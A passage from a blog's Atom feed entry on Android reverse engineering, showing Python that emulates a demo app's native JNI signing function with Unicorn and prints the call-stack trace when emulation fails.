com_sec_udemo_MainActivity()</span><br><span class="line">    sign = emulator.call_symbol(libnat_mod,<span class="string">&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;</span>,</span><br><span class="line">                         emulator.java_vm.jni_env.address_ptr,obj,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sign)</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 打印调用栈</span></span><br><span class="line">    tracks = dbg.get_tracks()</span><br><span class="line">    <span class="comment"># 这里打印调用地址即可，打印后100条</span></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> tracks[-<span class="number">100</span>:-<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(addr - <span class="number">0xcbc66000</span>))</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;unicorn_starting&lt;/p&gt;
&lt;p&gt;模拟Jni与Java交互&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
</feed>
